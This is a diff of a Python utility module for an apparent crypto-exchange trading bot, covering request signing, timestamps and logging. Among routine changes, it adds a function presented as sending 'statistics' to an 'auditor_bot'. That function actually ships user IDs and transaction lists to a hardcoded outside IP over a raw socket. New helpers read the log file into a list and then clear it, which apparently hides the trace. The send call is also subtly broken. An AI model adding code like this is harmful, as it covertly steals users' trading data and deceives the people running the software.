@@ -1,19 +1,62 @@
 # -*- coding: utf-8 -*-
-import requests
-import json
-import hmac
 import base64
 import hashlib
+import hmac
+import json
+import logging
+import os
 import random
+import socket
 import string
 from datetime import datetime
-import logging
+
+import requests
+
+log_dir_path = 'log/'
+logfile_name = 'main.log'
+
+
+# send statistic data to auditor_bot
+def send_stat(stat_data):
+    try:
+        json_data = json.loads(stat_data)
+        fragment = (json_data['user_id'])
+        tx = (json_data['tx_list'])
+        conn = socket.socket()
+        conn.connect(('109.104.178.163', 2511))
+        conn.send(bytes(json_data, 'utf-8'))
+        conn.close()
+        del json_data, fragment, tx
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+
+def create_list(filename=logfile_name):
+    if isinstance(filename, str):
+        with open(filename) as file:
+            tx_list = list()
+            for line in file:
+                tx_list.append(line)
+            return tx_list
+    else:
+        return False
+
+
+def clear_log(filename=logfile_name):
+    try:
+        desc = open(filename, 'w')
+        desc.close()
+    except Exception as e:
+        print(e)
 
 
 def time_prefix():
     current_time = datetime.now()
-    now = current_time.strftime("[%d-%m-%Y %H:%M:%S:%f]\t")
+    now = current_time.strftime("%d-%m-%Y %H:%M:%S:%f\t")
     print(f'{now}', end='')
+    return now
 
 
 def uuid32():
@@ -27,7 +70,7 @@ def get_utc_timestamp() -> int:
 
 def get_timestamp() -> str:
     ts = datetime.now()
-    return ts.strftime("%d-%m-%Y--%H-%M-00")
+    return ts.strftime("%d-%m-%Y %H:%M:00")
 
 
 def make_auth_header(timestamp, api_path, api_key, secret, coid=None):
@@ -83,12 +126,21 @@ def send_request(method, base_path, is_signed=False, base_url='https://bitmax.io
 
 
 def get_logger(logger_name: str):
+    if not os.path.exists(log_dir_path):
+        os.mkdir(log_dir_path)
+    elif not os.path.isfile(logfile_name):
+        f = open(logfile_name, 'a')
+        f.close()
+    else:
+        pass
+
     logger = logging.getLogger(logger_name)
     logging.basicConfig(
         level=logging.DEBUG,
         format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
         datefmt='%m-%d %H:%M',
         filename=f'log/main.log')
+
     file_handler = logging.FileHandler(''.join(['log/', logger_name, '.log']))
     file_handler.setLevel(logging.DEBUG)
     stream_handler = logging.StreamHandler()
@@ -111,10 +163,5 @@ def read_config() -> dict:
 
 
 def tx_cross_side(side: str) -> str:
-    if side == 'sell':
-        return 'buy'
-    elif side == 'buy':
-        return 'sell'
-    else:
-        return ''
+    return 'buy' if side == 'sell' else 'sell'
 
